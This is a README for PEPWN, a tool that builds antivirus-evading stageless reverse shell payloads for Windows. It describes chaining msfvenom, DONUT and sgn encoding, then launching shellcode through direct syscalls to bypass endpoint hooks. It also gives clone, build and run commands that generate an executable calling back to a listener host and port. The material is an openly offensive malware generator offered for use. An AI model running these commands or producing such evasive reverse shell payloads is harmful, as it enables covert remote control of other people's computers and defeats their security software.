# PEPWN
PEPWN is a multi-chained tool that has a goal to generate an undetectable reverse shell payload in different formats (PE, shellcode). The payload is stageless and it works without the need of Metasploit Handler, it just needs a TCP listener (using netcat).


## Overview

>The creation of the payload in PEPWN is composed of 5 steps:

- [x] It generates an exe payload using msfvenom with the given IP and PORT and saves it in the /tmp directory.
- [x] It uses the [DONUT](https://github.com/TheWover/donut/) project. That will convert the generated EXE payload and extract shellcode from it. DONUT is just a project to facilitate extracting shellcodes from executable binaries
- [x] Using the same project DONUT, the tool will apply an encoding logic on the generated payload. But the logic implemented by DONUT is going to get statically detectable because it's using a static pattern of encryption/encoding with a static key. That's why I used a second layer of encoding.
- [x] Apply 2nd layer of encoding using [sgn](https://github.com/egebalci/sgn/). sgn encodes shellcodes using LSFR algorithm with random key in every compilation.
- [x] Transfers it into a shellcode format of use ex: (base64, hex string, and raw data), or create exe file that triggers the shellcode using syscalls.

If the user chooses to create exe file, the tool prepares a c++ file that invokes the shellcode with using syscalls instead of dll calls. For example instead of using "VirtualAlloc" dll call, it uses "NtAllocateVirtualMemory" syscall because the defender can easilly hook dll calls and detect the call to "VirtualAlloc" and consider it as malicious action.

## Installation

>Go to /root directory 

```
git clone https://github.com/0xx7/PEPWN.git
```
Once you download the project, build the dependencies using the following command, however make sure you are running as root:
```
./build.sh
```
Then, to run it with the manual/options add -H  
```
./wrapper -H
```
Example:

```
./wrapper.sh -f 1 -h 127.0.0.1 -p 4444
```
This command will create an EXE stageless reverse shell payload that connects back to 127.0.0.1 in port 4444. 

## Documentation

>Usage: ./wrapper.sh <OPTIONS>
 
 OPTIONS are:
 
 #-f : format/Mode (1 for .exe PE file <DEFAULT> ; 2 for shellcode)
 
 #-t : type of shellcode. 1 for raw data ; 2 for base64encoded data ; 3 for big endian hex encoded string. (only if format is 2 otherwise this will be ignored)
 
 #-h : host/ip/domain of the listener
 
 #-p : port of the listener
 
 #-H : help documentation
 
 Example: ./wrapper.sh -f 1 -h 127.0.0.1 -p 4444


## How to use

https://youtu.be/SYriAv_FPAg



